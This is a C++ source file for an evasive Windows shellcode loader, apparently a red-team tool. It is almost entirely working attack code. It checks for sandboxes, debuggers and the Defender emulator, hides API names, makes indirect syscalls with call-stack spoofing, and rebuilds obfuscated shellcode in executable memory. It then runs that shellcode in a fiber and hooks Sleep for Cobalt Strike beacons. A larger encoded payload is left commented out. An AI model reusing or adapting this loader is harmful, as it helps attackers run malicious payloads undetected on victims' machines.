/*
* Credits
*
* MDSec - Resolving System Service Numbers using the Exception Directory
* https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/
*
* cpu0x00 - Ghost: Evasive shellcode loader
* https://github.com/cpu0x00/Ghost
*
* susMdT - LoudSunRun: Stack Spoofing with Synthetic frames based on the work of namazso, SilentMoonWalk, and VulcanRaven
* https://github.com/susMdT/LoudSunRun
*
* HulkOperator - x64 Call Stack Spoofing
* https://hulkops.gitbook.io/blog/red-team/x64-call-stack-spoofing
* https://github.com/HulkOperator/CallStackSpoofer
*
* Jan Vojtesek - Raspberry Robin's Roshtyak: A Little Lesson in Trickery
* https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/
*
* dadevel - Detecting Sandboxes Without Syscalls
* https://pentest.party/posts/2024/detecting-sandboxes-without-syscalls/
*/
#include "includes.h"

EXTERN_C DWORD dwSSN = 0;
EXTERN_C PVOID qwJMP = 0;
EXTERN_C PVOID CallR12(PVOID Function, ULONGLONG nArgs, PVOID r12_gadget, ...);
NTAPI_FUNCTION CallMe();

PBYTE hNtdll = FindModuleBase("ntdll.dll");
PBYTE hKernel32 = FindModuleBase("KERNEL32.DLL");
BYTE callR12sig[] = { 0x41, 0xFF, 0xD4 };
std::vector<PVOID> callR12gadgets = CollectGadgets(callR12sig, sizeof(callR12sig), hNtdll);
PVOID gadget = nullptr;
NTSTATUS status = STATUS_UNSUCCESSFUL;

CHAR NtCE[] = "ZwCreateEvent";
CHAR NtWFSO[] = "ZwWaitForSingleObject";
SyscallEntry NtCreateEvent = SSNLookup(NtCE);
SyscallEntry sysNtWaitForSingleObject = SSNLookup(NtWFSO); // NtWaitForSingleObject is predefined in winternl.h

LPVOID mainFiber = nullptr;
LPVOID shellcodeFiber = nullptr;

// Function to deobfuscate ASCII-encoded strings
std::unique_ptr<char[]> unASCIIme(const int* asciiValues, size_t length) {
	auto decoded = std::make_unique<char[]>(length + 1);

	for (size_t i = 0; i < length; ++i)
		decoded[i] = static_cast<char>(asciiValues[i]);

	decoded[length] = '\0'; // Null-terminate the string
	return decoded;
}

VOID RunMe() {
	const PKUSER_SHARED_DATA ksd = (PKUSER_SHARED_DATA)KUSER_SHARED_DATA_ADDRESS;

	// Check if Secure Boot is enabled
	if (!ksd->DbgSecureBootEnabled) __fastfail(0xc00000022); // Exit process if Secure Boot is disabled

	// Check for number of processors
	if (ksd->ActiveProcessorCount <= 4) __fastfail(0xc00000022); // Exit process if 4 or less active processors

	constexpr uint32_t TICKS_PER_SECOND = 10'000'000;
	LARGE_INTEGER time1;
	time1.LowPart = ksd->InterruptTime.LowPart;
	time1.HighPart = ksd->InterruptTime.High2Time;
	//if ((time1.QuadPart / TICKS_PER_SECOND / 60 / 60) < 1) __fastfail(0xc00000022); // Exit process if uptime is less than 1 hour

	//if (ksd->BootId < 100) __fastfail(0xc00000022); // Exit process if boot count is less than 100

	// Check for KdDebuggerEnabled
	if (ksd->KdDebuggerEnabled) __fastfail(0xc00000022); // Exit process if true

	// Simple check for VDLLs / Defender emulator
	if (GetProcAddress((HMODULE)hNtdll, "MpVmp32Entry")) __fastfail(0xc00000022); // Exit process if VDLL import is successful

	// Another check for debugger
	const int aZwQIP[] = { 90, 119, 81, 117, 101, 114, 121, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 80, 114, 111, 99, 101, 115, 115 };
	std::unique_ptr<char[]> ZwQIP = unASCIIme(aZwQIP, (sizeof(aZwQIP) / sizeof(aZwQIP[0])));
	const PCHAR NtQIP = ZwQIP.get();

	SyscallEntry NtQueryInformationProcess = SSNLookup(NtQIP);
	dwSSN = NtQueryInformationProcess.SSN;
	qwJMP = NtQueryInformationProcess.Syscall;
	gadget = GoGoGadget(callR12gadgets);

	PVOID debugFlags = nullptr;
	if (NT_SUCCESS((NTSTATUS)CallR12(
		(PVOID)CallMe,
		4,
		gadget,
		NtCurrentProcess(),
		(PROCESSINFOCLASS)31, // ProcessDebugFlags
		&debugFlags,
		sizeof(debugFlags),
		NULL
	)) && debugFlags) __fastfail(0xC0000409); // Exit process if debugger is detected

	// Shellcode deobfuscation and preparation

	PVOID sQATYZiadfSTZLXV = EncodePointer((PVOID)0x4831ff48f7e76548);
	PVOID EJTlNklopQikQoWO = EncodePointer((PVOID)0x8b5860488b5b1848);
	PVOID SAXMvRQSOZxLTzSw = EncodePointer((PVOID)0x8b5b20488b1b488b);
	PVOID XMQCATnkaDEljeSX = EncodePointer((PVOID)0x1b488b5b204989d8);
	PVOID lDztTvvYfwpwYQiQ = EncodePointer((PVOID)0x8b5b3c4c01c34831);
	PVOID lchGHSJvFPHdkWey = EncodePointer((PVOID)0xc96681c1ff8848c1);
	PVOID BLmfAUnvdYqgDpZN = EncodePointer((PVOID)0xe9088b140b4c01c2);
	PVOID GdhMNpvHNkRCEPEL = EncodePointer((PVOID)0x4d31d2448b521c4d);
	PVOID AufOpXXlJBQNvsDk = EncodePointer((PVOID)0x01c24d31db448b5a);
	PVOID yyfEcAASZrKbyOJG = EncodePointer((PVOID)0x204d01c34d31e444);
	PVOID hVMqnnEQMsqHzDZU = EncodePointer((PVOID)0x8b62244d01c4eb32);
	PVOID NnbvkVMKiuPkUsVK = EncodePointer((PVOID)0x5b594831c04889e2);
	PVOID KfiOgXhZZupzcNqy = EncodePointer((PVOID)0x51488b0c244831ff);
	PVOID GQmBoonrnHgRkbVv = EncodePointer((PVOID)0x418b3c834c01c748);
	PVOID bzggKiErILykvlKg = EncodePointer((PVOID)0x89d6f3a6740548ff);
	PVOID kNIJhSTCvlviIvXy = EncodePointer((PVOID)0xc0ebe65966418b04);
	PVOID jhFUVYmRXCmdeNfU = EncodePointer((PVOID)0x44418b04824c01c0);
	PVOID iPlLORXJnhwRPxWH = EncodePointer((PVOID)0x53c34831c980c107);
	PVOID IcFSgyzZjmPpvPyg = EncodePointer((PVOID)0x48b8ffa89691ba87);
	PVOID vDVvdREuUcKHkxEv = EncodePointer((PVOID)0x9a9c48c1e80848f7);
	PVOID lXQFZFtaicuSjPxG = EncodePointer((PVOID)0xd05051e8b0ffffff);
	PVOID UzuiowLGleODZYmt = EncodePointer((PVOID)0x4989c64831c05048);
	PVOID TGhlvGMMyGOHcnuc = EncodePointer((PVOID)0xb89c9e939cd19a87);
	PVOID pudaohYFbVbCgEAB = EncodePointer((PVOID)0x9a48f7d0504831d2);
	PVOID hpALNpOuyJePvZQR = EncodePointer((PVOID)0x48ffc24889e14883);
	PVOID kDHoFRQQYcBANpKG = EncodePointer((PVOID)0xec2041ffd64883c4);
	PVOID wixQHsdBsyaOmupu = EncodePointer((PVOID)0x20c3909090909090);

	std::vector<PVOID> encodedSegments = {
		sQATYZiadfSTZLXV, EJTlNklopQikQoWO, SAXMvRQSOZxLTzSw, XMQCATnkaDEljeSX, lDztTvvYfwpwYQiQ, lchGHSJvFPHdkWey, BLmfAUnvdYqgDpZN, GdhMNpvHNkRCEPEL, AufOpXXlJBQNvsDk, yyfEcAASZrKbyOJG, hVMqnnEQMsqHzDZU, NnbvkVMKiuPkUsVK, KfiOgXhZZupzcNqy, GQmBoonrnHgRkbVv, bzggKiErILykvlKg, kNIJhSTCvlviIvXy, jhFUVYmRXCmdeNfU, iPlLORXJnhwRPxWH, IcFSgyzZjmPpvPyg, vDVvdREuUcKHkxEv, lXQFZFtaicuSjPxG, UzuiowLGleODZYmt, TGhlvGMMyGOHcnuc, pudaohYFbVbCgEAB, hpALNpOuyJePvZQR, kDHoFRQQYcBANpKG, wixQHsdBsyaOmupu,
	};

	/*
	PVOID krIEKgMUckshcyth = EncodePointer((PVOID)0x4831c94881e98cff);
	PVOID QWkajnALnvaRsXCA = EncodePointer((PVOID)0xffff488d05efffff);
	PVOID CeYoXADihJDoHkcl = EncodePointer((PVOID)0xff48bbaee21ec0b3);
	PVOID nfjTEYcZQXkZiWvq = EncodePointer((PVOID)0x25756d4831582748);
	PVOID tGBPOHuvKLwWbBtJ = EncodePointer((PVOID)0x2df8ffffffe2f452);
	PVOID HQqVSTVgjAGxTLla = EncodePointer((PVOID)0xaa9d2443cdbd6dae);
	PVOID IyJIcAzzdurFOXMr = EncodePointer((PVOID)0xe25f91f275273cf8);
	PVOID EomlYIUvHVPzVCPq = EncodePointer((PVOID)0xaa2f12d66dfe3fce);
	PVOID MhLnnvUpqwnGeCQO = EncodePointer((PVOID)0xaa9592ab6dfe3f8e);
	PVOID lAVufBEVDLjdqjSN = EncodePointer((PVOID)0xaa95b2e36d7adae4);
	PVOID lyIsmmKQJJFMxyIP = EncodePointer((PVOID)0xa853f17a6d44ad02);
	PVOID wCmtzFFisgJoeFTu = EncodePointer((PVOID)0xde7fbcb109552c6f);
	PVOID uBQaheNuCEJPdxkE = EncodePointer((PVOID)0x2b1381b2e49780fc);
	PVOID yrAqmLdqjkZBZUXE = EncodePointer((PVOID)0xa34f88387755e6ec);
	PVOID xCvJXFXIYPisMYMl = EncodePointer((PVOID)0xde56c16343f415b6);
	PVOID LMyfWsonixmJCjKt = EncodePointer((PVOID)0xe91cb5c1aef5e5ae);
	PVOID umAuguFVUxEEpqcK = EncodePointer((PVOID)0xe21e8836e5010ae6);
	PVOID aiIvegbEKgBAvdpR = EncodePointer((PVOID)0xe3ce90386d6d2925);
	PVOID ZItbRCkHKHFHckqE = EncodePointer((PVOID)0xa23e89b2f5963be6);
	PVOID ZUJPGKeSgjpvZvpg = EncodePointer((PVOID)0x1dd7813811fd25af);
	PVOID MDrHafAiCgwASRzu = EncodePointer((PVOID)0x3453f17a6d44ad02);
	PVOID CFlaqnulvNhVlsuQ = EncodePointer((PVOID)0xa3df09be6474ac96);
	PVOID dildBNSkNXDncZir = EncodePointer((PVOID)0x026b31ff263949a6);
	PVOID UlXnockwSnbogPmD = EncodePointer((PVOID)0xa72711c6fd2d2925);
	PVOID JVPKCMOVrbhTPhfT = EncodePointer((PVOID)0xa23a89b2f5132c25);
	PVOID onyrPdbCvnfjhTNU = EncodePointer((PVOID)0xee568438656924af);
	PVOID kFTLVfxydGdjJEbU = EncodePointer((PVOID)0x325f4bb7ad3d6c7e);
	PVOID PHVVjcHnnMIZKTxt = EncodePointer((PVOID)0xa34681eb7b2c37ef);
	PVOID BABOMVJKASBILOkV = EncodePointer((PVOID)0xba5f99f27f3dee42);
	PVOID dEDiMsmKQdoHMiWr = EncodePointer((PVOID)0xc25f924cc52d2cf7);
	PVOID EJOAmoTqhdxPYXLc = EncodePointer((PVOID)0xb8564ba1cc3a9251);
	PVOID psgWEvdDRudqaGGs = EncodePointer((PVOID)0x1d43aab36ccb1ac7);
	PVOID ZoEnKeyVrVRkPuTk = EncodePointer((PVOID)0x8c77aed651752cf8);
	PVOID iTcyNhLMShqPlLZs = EncodePointer((PVOID)0xab9726ffac842c14);
	PVOID qoJiHAESeTpwXDSd = EncodePointer((PVOID)0xae69e6b4daa0259f);
	PVOID aOJgXyvKxIvgoBgJ = EncodePointer((PVOID)0x2b56f1616844ade3);
	PVOID xfrAixNWrcXrheuk = EncodePointer((PVOID)0xd3d781e364252c14);
	PVOID aJIVbhbZxcbrhypR = EncodePointer((PVOID)0xd848b914daa0843d);
	PVOID VwYJJeTakOnoCMPt = EncodePointer((PVOID)0xe21ec0e96dfcacef);
	PVOID rlUuwMIqANbovtbA = EncodePointer((PVOID)0x5aa5c1b325385c67);
	PVOID jDFVdQIPDyUVhMBE = EncodePointer((PVOID)0xa34f81e24f762cff);
	PVOID knDHyhHBZVbSkLTv = EncodePointer((PVOID)0xa3a4973abab3927b);
	PVOID LUMvamZSJwELMLoQ = EncodePointer((PVOID)0x09679bfbacb4259f);
	PVOID bTwcgbZbeAxmTAYZ = EncodePointer((PVOID)0x3057496b6844a4fc);
	PVOID jTbpRPdGmOjyvWon = EncodePointer((PVOID)0x8a1ef273a1273fef);
	PVOID SmsRxxsOPSnuEhDy = EncodePointer((PVOID)0x58f5959d1e8ab8e6);
	PVOID YCyjFvpSdYSlBJyj = EncodePointer((PVOID)0x6bd88830e62507a4);
	PVOID GntpyNoBQXpbosRA = EncodePointer((PVOID)0xbd5649429f6a6dae);
	PVOID EiHSXDEEmVtPIvPs = EncodePointer((PVOID)0xe274c0dba5466dae);
	PVOID XIbJRyCtStexapEh = EncodePointer((PVOID)0xab9720f29c716dae);
	PVOID oSmfRVGkIijIMsTK = EncodePointer((PVOID)0xe25f7ac663ebeb51);
	PVOID PcRTPakTcHrHFxmH = EncodePointer((PVOID)0x375649426dfcb7e7);
	PVOID YtjjHzbzkpqYCbGz = EncodePointer((PVOID)0x25de3f4cda8a209f);
	PVOID HfLVqFQwkOEsWtbl = EncodePointer((PVOID)0x2b4c92f29f586bb6);
	PVOID LOejixJWRypNFlbg = EncodePointer((PVOID)0x99e11536e57ae833);
	PVOID DyOkeoKaoYMZCVlG = EncodePointer((PVOID)0xe31ec0fbdaba622a);
	PVOID xTDWSjXynEghzrHl = EncodePointer((PVOID)0x6e1fc0b3cec6844a);
	PVOID wokRsoosPSrXRxoX = EncodePointer((PVOID)0xe31ec05ba78a9251);
	PVOID IfskwrDHMOCaJVlY = EncodePointer((PVOID)0xcd4ca6ff7c758ad8);
	PVOID HwRLpNYHwsFUeyDw = EncodePointer((PVOID)0x7521a081518bc619);
	PVOID lmGqmZrvlGUOrRKB = EncodePointer((PVOID)0x2edf62efea476fe0);
	PVOID kjhzgnhkazaLpOaf = EncodePointer((PVOID)0xdf2fd4284b064e57);
	PVOID SFBoFCsOqDApIthi = EncodePointer((PVOID)0x83134b9403cf3cb4);
	PVOID GUurAqySyQdiTqVg = EncodePointer((PVOID)0xeb56c407abc7e138);
	PVOID SEoErayORsYSBPsa = EncodePointer((PVOID)0xc89c92eed7e9fa29);
	PVOID HEGkFPbqTTzchkZt = EncodePointer((PVOID)0xb5871f8351984a22);
	PVOID xGrHkQQPiNGkFFVJ = EncodePointer((PVOID)0x902ddd7af17ae948);
	PVOID OvbCdXvSdFRrnfCI = EncodePointer((PVOID)0xd143b2341fccb4ae);
	PVOID tgHtuLOhwbmqHRjB = EncodePointer((PVOID)0xb76da5c108340acb);
	PVOID memKxcpTMMzDpryc = EncodePointer((PVOID)0x8c6afa93681a17c7);
	PVOID aoyQmYeyjLSnrSrx = EncodePointer((PVOID)0x8e72a19c105b5d8e);
	PVOID YgnEoeUlhddvVQTm = EncodePointer((PVOID)0xca7dafde551419c7);
	PVOID whjkzDKpJpQCVCBs = EncodePointer((PVOID)0x8072a58805383ee7);
	PVOID LefRaQEduzEOJwVe = EncodePointer((PVOID)0xa73ef99d154e4df9);
	PVOID YrYCQrExJKWDsNpf = EncodePointer((PVOID)0x8b70a4dc52064de0);
	PVOID oqRFDusrpLSbPphX = EncodePointer((PVOID)0xb63ef69d144e4df9);
	PVOID yvfaBpFPYFzSyQAe = EncodePointer((PVOID)0x8b70f6871e551598);
	PVOID TPPCEEWVmOPBVMhc = EncodePointer((PVOID)0xd625e0e7571c09cb);
	PVOID QtiImdJSPmAbIdYe = EncodePointer((PVOID)0x8c6aef860b45568e);
	PVOID eLCBuECVLmRGqvfu = EncodePointer((PVOID)0xa368a1dd51552fdc);
	PVOID RkiXjfwMXsmrknjO = EncodePointer((PVOID)0x8d69b3d6575c60a4);
	PVOID UlGnizOxTJCwMmHI = EncodePointer((PVOID)0xe2707c0a347d598e);
	PVOID qZExSoKoNEXvtTlz = EncodePointer((PVOID)0xbeaab191b6de0212);
	PVOID RbFVCMekFTdhQOha = EncodePointer((PVOID)0x30b96d74f6651de0);
	PVOID HiwzwEzvuPqarpwk = EncodePointer((PVOID)0x776556e29d8d81b6);
	PVOID ybwPLsWnYaOtxkMT = EncodePointer((PVOID)0x32f60c2b1f47267f);
	PVOID AJbMNddZoUCBKwLI = EncodePointer((PVOID)0xbc792f1d2a480cf2);
	PVOID VbUhsxlgakUxfFWj = EncodePointer((PVOID)0x3edf495404d6ad6c);
	PVOID SCuTpiPFsyydpUcV = EncodePointer((PVOID)0x7d933955b10bda58);
	PVOID zUTCMPUlfduLGXPU = EncodePointer((PVOID)0x584850a84deaf6fe);
	PVOID DylxQsmDjSozMMxM = EncodePointer((PVOID)0x4f0a857c24deb36d);
	PVOID NVkQklrWstmsSAiw = EncodePointer((PVOID)0x7313a0ca27324d49);
	PVOID HNmhsNxSvLjRpqAc = EncodePointer((PVOID)0x83f587278170bb40);
	PVOID zSLuOBvdZBzznIvK = EncodePointer((PVOID)0x96143eccabbbf0ee);
	PVOID VxVycFciJqqThtEu = EncodePointer((PVOID)0xc647054aa7f03fa8);
	PVOID dgjMvpNGeaxEuRxr = EncodePointer((PVOID)0x121dbb3150ca4c8d);
	PVOID ENcMqFMOSzmJTbUU = EncodePointer((PVOID)0xc3d5583a9a1aee3e);
	PVOID KKuLFnbeRMMOkedy = EncodePointer((PVOID)0xd1f42710416e2b4f);
	PVOID ZgMMdogCmHDUUukz = EncodePointer((PVOID)0xfe2e32ac67fe2c6c);
	PVOID CxdwxNOEssmeUHfm = EncodePointer((PVOID)0x07a66d36cc8463af);
	PVOID FfyoAvOYVUSKVAzD = EncodePointer((PVOID)0x816204c9cf608d7d);
	PVOID ZCPMUWeDAdXigRtD = EncodePointer((PVOID)0xdf0c7c48750401fa);
	PVOID GcpTiltvPYfYLByL = EncodePointer((PVOID)0x6440564f52f14b61);
	PVOID hkIaGKIPEsfchJii = EncodePointer((PVOID)0xf7c6dd4713cb25f8);
	PVOID JtXCgcjawgmfmmYz = EncodePointer((PVOID)0x4396e7c465f38001);
	PVOID EaPhWisXFOXALwvu = EncodePointer((PVOID)0x5ab46fb99b11b6ae);
	PVOID ceOPQDcrBgRHbKhs = EncodePointer((PVOID)0xa3a030068723927b);
	PVOID rtvYLBjAHBxWFnEe = EncodePointer((PVOID)0xaa2f090925752dae);
	PVOID paTgHCLbLPZOMFnG = EncodePointer((PVOID)0xa3a6c0a325752c17);
	PVOID pwBDbhXREYBnCIIW = EncodePointer((PVOID)0xa21ec0b364cf350a);
	PVOID ldWBkSthBfKmzZxE = EncodePointer((PVOID)0xb1fb3f666de63efd);
	PVOID EBhgqEDeboRHaFvr = EncodePointer((PVOID)0xaa9727fbac842527);
	PVOID qmMwJdHAeiMmEiyq = EncodePointer((PVOID)0x385f78b305756de7);
	PVOID KRzXAMZWRINZuHsb = EncodePointer((PVOID)0x6be7810937e3e44c);
	PVOID GikexHLZKjRWaytn = EncodePointer((PVOID)0x1dcb8830e155e86e);
	PVOID JINcqvcBwtxUNHDs = EncodePointer((PVOID)0x96a8a638223d6c6d);
	PVOID XQbBOLueHittAYfr = EncodePointer((PVOID)0x67deb5647d2d35e6);
	PVOID lJOjAuLhQrnAueya = EncodePointer((PVOID)0xe71ec0b32525ae46);
	PVOID qvhawvNPscjIIsvz = EncodePointer((PVOID)0x9de33f4c1445439a);
	PVOID QKhlMrDkiQesodAU = EncodePointer((PVOID)0xd030f4810b406d94);
	PVOID cCqPJkKulaeTiDQi = EncodePointer((PVOID)0x3c7671b325756d90);

	std::vector<PVOID> encodedSegments = {
		krIEKgMUckshcyth, QWkajnALnvaRsXCA, CeYoXADihJDoHkcl, nfjTEYcZQXkZiWvq, tGBPOHuvKLwWbBtJ, HQqVSTVgjAGxTLla, IyJIcAzzdurFOXMr, EomlYIUvHVPzVCPq, MhLnnvUpqwnGeCQO, lAVufBEVDLjdqjSN, lyIsmmKQJJFMxyIP, wCmtzFFisgJoeFTu, uBQaheNuCEJPdxkE, yrAqmLdqjkZBZUXE, xCvJXFXIYPisMYMl, LMyfWsonixmJCjKt, umAuguFVUxEEpqcK, aiIvegbEKgBAvdpR, ZItbRCkHKHFHckqE, ZUJPGKeSgjpvZvpg, MDrHafAiCgwASRzu, CFlaqnulvNhVlsuQ, dildBNSkNXDncZir, UlXnockwSnbogPmD, JVPKCMOVrbhTPhfT, onyrPdbCvnfjhTNU, kFTLVfxydGdjJEbU, PHVVjcHnnMIZKTxt, BABOMVJKASBILOkV, dEDiMsmKQdoHMiWr, EJOAmoTqhdxPYXLc, psgWEvdDRudqaGGs, ZoEnKeyVrVRkPuTk, iTcyNhLMShqPlLZs, qoJiHAESeTpwXDSd, aOJgXyvKxIvgoBgJ, xfrAixNWrcXrheuk, aJIVbhbZxcbrhypR, VwYJJeTakOnoCMPt, rlUuwMIqANbovtbA, jDFVdQIPDyUVhMBE, knDHyhHBZVbSkLTv, LUMvamZSJwELMLoQ, bTwcgbZbeAxmTAYZ, jTbpRPdGmOjyvWon, SmsRxxsOPSnuEhDy, YCyjFvpSdYSlBJyj, GntpyNoBQXpbosRA, EiHSXDEEmVtPIvPs, XIbJRyCtStexapEh, oSmfRVGkIijIMsTK, PcRTPakTcHrHFxmH, YtjjHzbzkpqYCbGz, HfLVqFQwkOEsWtbl, LOejixJWRypNFlbg, DyOkeoKaoYMZCVlG, xTDWSjXynEghzrHl, wokRsoosPSrXRxoX, IfskwrDHMOCaJVlY, HwRLpNYHwsFUeyDw, lmGqmZrvlGUOrRKB, kjhzgnhkazaLpOaf, SFBoFCsOqDApIthi, GUurAqySyQdiTqVg, SEoErayORsYSBPsa, HEGkFPbqTTzchkZt, xGrHkQQPiNGkFFVJ, OvbCdXvSdFRrnfCI, tgHtuLOhwbmqHRjB, memKxcpTMMzDpryc, aoyQmYeyjLSnrSrx, YgnEoeUlhddvVQTm, whjkzDKpJpQCVCBs, LefRaQEduzEOJwVe, YrYCQrExJKWDsNpf, oqRFDusrpLSbPphX, yvfaBpFPYFzSyQAe, TPPCEEWVmOPBVMhc, QtiImdJSPmAbIdYe, eLCBuECVLmRGqvfu, RkiXjfwMXsmrknjO, UlGnizOxTJCwMmHI, qZExSoKoNEXvtTlz, RbFVCMekFTdhQOha, HiwzwEzvuPqarpwk, ybwPLsWnYaOtxkMT, AJbMNddZoUCBKwLI, VbUhsxlgakUxfFWj, SCuTpiPFsyydpUcV, zUTCMPUlfduLGXPU, DylxQsmDjSozMMxM, NVkQklrWstmsSAiw, HNmhsNxSvLjRpqAc, zSLuOBvdZBzznIvK, VxVycFciJqqThtEu, dgjMvpNGeaxEuRxr, ENcMqFMOSzmJTbUU, KKuLFnbeRMMOkedy, ZgMMdogCmHDUUukz, CxdwxNOEssmeUHfm, FfyoAvOYVUSKVAzD, ZCPMUWeDAdXigRtD, GcpTiltvPYfYLByL, hkIaGKIPEsfchJii, JtXCgcjawgmfmmYz, EaPhWisXFOXALwvu, ceOPQDcrBgRHbKhs, rtvYLBjAHBxWFnEe, paTgHCLbLPZOMFnG, pwBDbhXREYBnCIIW, ldWBkSthBfKmzZxE, EBhgqEDeboRHaFvr, qmMwJdHAeiMmEiyq, KRzXAMZWRINZuHsb, GikexHLZKjRWaytn, JINcqvcBwtxUNHDs, XQbBOLueHittAYfr, lJOjAuLhQrnAueya, qvhawvNPscjIIsvz, QKhlMrDkiQesodAU, cCqPJkKulaeTiDQi,
	};
	*/

	// Predefine expected shellcode size and pre-allocate space
	alignas(8) std::vector<UCHAR> shellcode;
	//shellcode.reserve(968);
	shellcode.reserve(392);

	// Decode and reconstruct each segment
	for (auto encodedSegment : encodedSegments) {
		UINT_PTR decodedSegment = reinterpret_cast<UINT_PTR>(DecodePointer(encodedSegment));

		// Extract each byte and place it in the shellcode buffer
		shellcode.push_back((decodedSegment >> 56) & 0xFF);
		shellcode.push_back((decodedSegment >> 48) & 0xFF);
		shellcode.push_back((decodedSegment >> 40) & 0xFF);
		shellcode.push_back((decodedSegment >> 32) & 0xFF);
		shellcode.push_back((decodedSegment >> 24) & 0xFF);
		shellcode.push_back((decodedSegment >> 16) & 0xFF);
		shellcode.push_back((decodedSegment >> 8) & 0xFF);
		shellcode.push_back(decodedSegment & 0xFF);
	}

	const int aZwAVM[] = { 90, 119, 65, 108, 108, 111, 99, 97, 116, 101, 86, 105, 114, 116, 117, 97, 108, 77, 101, 109, 111, 114, 121 }; // ZwAllocateVirtualMemory
	std::unique_ptr<char[]> ZwAVM = unASCIIme(aZwAVM, (sizeof(aZwAVM) / sizeof(aZwAVM[0])));
	const PCHAR NtAVM = ZwAVM.get();

	SyscallEntry NtAllocateVirtualMemory = SSNLookup(NtAVM);
	dwSSN = NtAllocateVirtualMemory.SSN;
	qwJMP = NtAllocateVirtualMemory.Syscall;
	gadget = GoGoGadget(callR12gadgets);

	PVOID baseAddress = nullptr;
	SIZE_T regionSize = shellcode.size();
	status = (NTSTATUS)CallR12(
		(PVOID)CallMe,
		6,
		gadget,
		NtCurrentProcess(),
		&baseAddress,
		(ULONGLONG)0,
		&regionSize,
		(ULONGLONG)(MEM_COMMIT | MEM_RESERVE),
		(ULONGLONG)(PAGE_EXECUTE_READWRITE)
	);

	const int aZwWVM[] = { 90, 119, 87, 114, 105, 116, 101, 86, 105, 114, 116, 117, 97, 108, 77, 101, 109, 111, 114, 121 }; // ZwWriteVirtualMemory
	std::unique_ptr<char[]> ZwWVM = unASCIIme(aZwWVM, (sizeof(aZwWVM) / sizeof(aZwWVM[0])));
	const PCHAR NtWVM = ZwWVM.get();

	SyscallEntry NtWriteVirtualMemory = SSNLookup(NtWVM);
	dwSSN = NtWriteVirtualMemory.SSN;
	qwJMP = NtWriteVirtualMemory.Syscall;
	gadget = GoGoGadget(callR12gadgets);

	SIZE_T bytesWritten = 0;
	status = (NTSTATUS)CallR12(
		(PVOID)CallMe,
		5,
		gadget,
		NtCurrentProcess(),
		baseAddress,
		shellcode.data(),
		(ULONGLONG)shellcode.size(),
		&bytesWritten
	);

	// Create a callable "function" from the allocated space
	void (*shellcodeFunc)() = (void(*)())baseAddress;

	// Hook Sleep and SleepEx for CS beacons
	ReSleep();

	gadget = GoGoGadget(callR12gadgets);
	mainFiber = (LPVOID)CallR12((PVOID)ConvertThreadToFiber, 1, gadget, nullptr);

	gadget = GoGoGadget(callR12gadgets);
	shellcodeFiber = (LPVOID)CallR12((PVOID)CreateFiber, 3, gadget, NULL, (LPFIBER_START_ROUTINE)shellcodeFunc, NULL);

	while (true) {
		gadget = GoGoGadget(callR12gadgets);
		CallR12((PVOID)SwitchToFiber, 1, gadget, shellcodeFiber);
	}
}

INT WINAPI CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
	if (FiveHourEnergy()) __fastfail(0x31337);
	RunMe();
	return 0;
}

/*
int main() {
	BYTE sig[] = { 0xff, 0x27 };
	std::vector<PVOID> gadgets = CollectGadgets(sig, 2, hNtdll);
	CheckGadgetPreBytes(gadgets, 2, 8);
}
*/